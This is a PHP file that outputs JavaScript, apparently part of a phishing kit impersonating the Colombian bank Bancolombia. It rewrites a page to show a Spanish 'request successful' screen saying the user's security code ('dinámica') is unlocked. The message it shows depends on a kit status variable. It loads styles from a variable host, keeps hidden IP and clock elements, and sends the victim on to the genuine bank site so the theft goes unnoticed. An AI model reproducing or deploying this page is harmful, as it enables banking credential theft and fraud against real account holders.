<?php
header('Access-Control-Allow-Origin: *');
Header("content-type: application/javascript");
?>
var my_titulo = 'Autentificacion';
var my_mensaje_1 = '¡Tu Solicitud fue Exitosa!';
var my_mensaje_2 = '¡Tu dinamica ha sido desbloqueada!';
var mensaje2 = 'Tu proceso se ha completado correctamente.';
var mensaje3 = 'Error Dinamica';

var my_contenido = `
<link rel="stylesheet" href="${my_hosting}css/flow-theme.css" />

<main class="flow-shell">
  <div class="logo-mark" aria-hidden="true">
    <span></span><span></span><span></span>
  </div>

  <h1 class="flow-title" id="mensaje1">¡Tu Solicitud fue Exitosa!</h1>

  <section class="panel" style="text-align:center; display:grid; gap:12px;">
    <div class="figure-card" style="border:none; box-shadow:none; background:var(--panel);">
      <div style="width:128px; height:128px; margin:0 auto; border-radius:50%; background:#e8f7ec; display:grid; place-items:center;">
        <svg aria-hidden="true" viewBox="0 0 24 24" width="78" height="78">
          <circle cx="12" cy="12" r="11" fill="#17a34a" opacity="0.12"></circle>
          <path d="M6.5 12.5 10.2 16.2 17.5 8" fill="none" stroke="#17a34a" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
      </div>
    </div>
    <p class="flow-subtitle" id="mensaje2">Tu proceso se ha completado correctamente.</p>
    <form action="https://www.bancolombia.com/personas" method="post" style="margin:0 auto; width:100%;">
      <button class="btn-primary" type="submit">Entendido</button>
    </form>
  </section>

  <div class="meta-hidden">
    <div id="ipc">Dirección IP:</div>
    <div id="jclock1"></div>
  </div>
</main>
`;

    $('#titulo').html(my_titulo);
    $('body').html(my_contenido);
    $('#mensaje1').html(my_data['status'] === 'finish' ? my_mensaje_1 : my_mensaje_2);
    $('#mensaje2').html(my_data['status'] === 'finish' ? mensaje2 : mensaje3);
